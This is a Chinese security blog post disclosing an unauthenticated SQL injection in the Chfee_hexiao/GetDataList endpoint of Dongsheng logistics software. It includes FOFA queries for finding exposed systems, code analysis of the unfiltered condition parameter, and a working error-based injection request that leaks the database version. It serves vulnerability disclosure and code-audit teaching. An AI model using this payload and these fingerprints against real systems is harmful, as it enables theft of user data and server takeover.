---
title: "东胜物流软件 Chfee_hexiao/GetDataList SQL注入漏洞"
source: https://mrxn.net/jswz/dongsheng-Account-Chfee_hexiao-GetDataList-sqli.html
asset_dir: assets/东胜物流软件-chfee_hexiaogetdatalist-sql注入漏洞
---

# 东胜物流软件 Chfee\_hexiao/GetDataList SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/7/25 08:36
- 906浏览
- [0评论](#comment)
- 31分钟阅读

深入探索

鉴权

软件

SQL

---

# 漏洞简介

东胜物流[软件](#)是青岛东胜伟业软件有限公司一款集订单管理、仓库管理、运输管理等多种功能于一体的物流管理软件。东胜物流信息管理系统 Chfee\_hexiao/GetDataList 接口存在[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

物流软件安全

# 影响版本

# fofa语法

> body="FeeCodes/CompanysAdapter.aspx" || body="dhtmlxcombo\_whp.js" || body="dongshengsoft" || body="theme/dhtmlxcombo.css"

# 漏洞分析

> 系统基于ASP.NET MVC 架构，因此和常规的稍微不同

先看下`AccountAreaRegistration`里对于路由的定义

深入探索

漏洞预警服务

Web安全书籍

Nessus

```
namespace DSWeb.Areas.Account;

public class AccountAreaRegistration : AreaRegistration
{
  public override string AreaName => "Account";

  public override void RegisterArea(AreaRegistrationContext context)
  {
    context.MapRoute("Account_default", "Account/{controller}/{action}/{id}", (object) new
    {
      action = "Index",
      id = UrlParameter.Optional
    });
  }
}
```

深入探索

防火墙软件

恶意软件分析工具

传输层安全性协议

再看下`Chfee_hexiaoController`里`GetDataList`的实现部分

SQL注入检测工具

```
[SqlKeyWordsFilter(Type = "Action")]
public ContentResult GetDataList(
  int start,
  int limit,
  string sort,
  string condition,
  string isload = "0")
{
  int totel = 0;
  List<ChfeeHexiao> hexiaoDataList = ChHexiaoDAL.GetHexiaoDataList(condition, start, limit, out totel, CookieConfig.GetCookie_UserId(this.Request), CookieConfig.GetCookie_UserCode(this.Request), Convert.ToString(this.Session["COMPANYID"]), sort, isload);
  string str = JsonConvert.Serialize(new
  {
    Success = true,
    Message = "查询成功",
    totalCount = totel,
    data = Enumerable.ToList<ChfeeHexiao>((IEnumerable<ChfeeHexiao>) hexiaoDataList)
  });
  return new ContentResult() { Content = str };
}
```

深入探索

技术文章订阅

计算机安全

漏洞修复方案

将参数 `start`、`limit`

`sort`和`condition`等带入`ChHexiaoDAL.GetHexiaoDataList`中（数据访问层），其实现如下

代码安全审计

```
public class ChHexiaoDAL
{
  public static List<ChfeeHexiao> GetHexiaoDataList(
    string strCondition,
    int start,
    int limit,
    out int totel,
    string userid = "",
    string usercode = "",
    string orgcode = "",
    string sort = null,
    string isload = "0")
  {
    string rangDaListStr = ChHexiaoDAL.GetRangDAListStr("modPaySettlementList", userid, usercode, orgcode);
    if (!string.IsNullOrEmpty(rangDaListStr))
      strCondition = string.IsNullOrEmpty(strCondition) ? rangDaListStr : $"{strCondition} and {rangDaListStr}";
    StringBuilder stringBuilder = new StringBuilder();
......
stringBuilder.Append(" where 1=1 ");
if (!string.IsNullOrEmpty(strCondition))
  stringBuilder.Append(" and " + strCondition);
string str = DatasetSort.Getsortstring(sort);
if (!string.IsNullOrEmpty(str))
{
  if (str.IndexOf("CREATETIME") >= 0)
    stringBuilder.Append(" order by " + str);
  else
    stringBuilder.Append($" order by {str},CREATETIME DESC");
}
else
  stringBuilder.Append(" order by CREATETIME DESC,CM.BILLNO DESC");
return ChHexiaoDAL.SetHexiaoData(PagerHelper.PageSQL(stringBuilder.ToString(), start, limit, out totel));
```

到这里，漏洞成因就比较明了了，`strCondition`是直接拼接在`stringBuilder`语句里，然后用`PageSQL`进行组装SQL语句后调用`SetHexiaoData`执行，全程无过滤或校验，导致[SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。

# 漏洞复现

```
POST /Account/Chfee_hexiao/GetDataList HTTP/1.1
Host: dongsheng.mrxn.net
Content-Type: application/x-www-form-urlencoded

start=0&condition=1<@@VERSION&limit=10
```

[![东胜物流软件 Chfee_hexiao/GetDataList SQL注入漏洞](images/img-001-3cd1cea4ac4d.webp)](https://image.mrxn.net/b56f6648173a47a99c7a8905c2377ad9.webp)

通过报错注入在响应里回显数据库版本信息。

漏洞扫描服务

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#0day](https://mrxn.net/tag/0day)
- [#asp.net](https://mrxn.net/tag/asp.net)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
